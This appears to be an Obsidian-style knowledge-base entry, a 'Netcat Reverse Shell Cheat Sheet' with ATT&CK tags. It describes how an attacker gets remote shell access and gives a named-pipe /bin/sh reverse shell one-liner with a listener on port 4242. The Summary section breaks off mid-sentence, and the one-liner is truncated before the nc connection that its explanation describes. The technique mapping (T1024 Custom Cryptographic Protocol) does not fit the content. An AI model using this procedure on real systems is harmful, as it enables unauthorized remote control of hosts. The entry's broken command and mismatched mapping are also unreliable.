---
id: 55f045ad-3696-40f2-bd78-d73b2446ea69
name: Netcat Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.404438+00:00'
updated_at: '2023-04-10T20:25:27.028306+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
tags:
- '[[Netcat BusyBox]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Netcat Reverse Shell Cheat Sheet

## Summary

A reverse shell is a powerful tool that allows an attacker to gain remote access to a compromised system. This cheat sheet focuses on using Netcat for a reverse shell. Netcat is a powerful tool that can be used to transfer files, scan ports, and create a reverse shell. A reverse shell created using

## Description

# Description

A reverse shell is a powerful tool that allows an attacker to gain remote access to a compromised system. This cheat sheet focuses on using Netcat for a reverse shell. Netcat is a powerful tool that can be used to transfer files, scan ports, and create a reverse shell. A reverse shell created using Netcat can be used to execute commands on the compromised system, upload and download files, and even pivot to other systems on the network.

Technical Explanation: A reverse shell is created by connecting to a remote system and executing a shell on that system. The shell is then redirected back to the attacker's machine, allowing the attacker to execute commands on the compromised system. Netcat is used to create a reverse shell by listening on a specific port on the attacker's machine and connecting to that port from the compromised system. Once the connection is established, a shell is executed on the compromised system and redirected back to the attacker's machine.

Business Value: A reverse shell can be used to gain remote access to a compromised system, allowing an attacker to steal sensitive data or use the system as a foothold for further attacks. By understanding how a reverse shell is created using Netcat, organizations can better defend against these types of attacks.

 

## Requirements

1. Authenticated access to the compromised system

1. Netcat installed on the compromised system

 

## Defense

1. Implement network segmentation to prevent lateral movement

1. Monitor network traffic for suspicious activity

1. Implement strong authentication mechanisms to prevent unauthorized access

 

## Objectives

1. Gain remote access to a compromised system

1. Execute commands on the compromised system

1. Upload and download files from the compromised system

1. Pivot to other systems on the network

 

# Instructions

1. This command creates a reverse shell connection to a remote host. It first removes any existing file named 'f' in the '/tmp' directory. Then, it creates a named pipe called 'f' in the '/tmp' directory. Next, it pipes the output of the 'cat' command (which reads from the named pipe) to the '/bin/sh' command with the '-i' option (which starts an interactive shell). Finally, it redirects the output of the 'nc' command (which establishes a TCP connection to the remote host) to the named pipe 'f'.

 



**Code**: [[rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i ]]



> The command takes no arguments, but it requires a listener on the remote host to be waiting for the connection. The listener should be set up to receive incoming connections on port 4242. Once the connection is established, the attacker can execute commands on the remote host as if they were sitting at a terminal on that machine.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]

## Tags

- [[Netcat BusyBox]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]


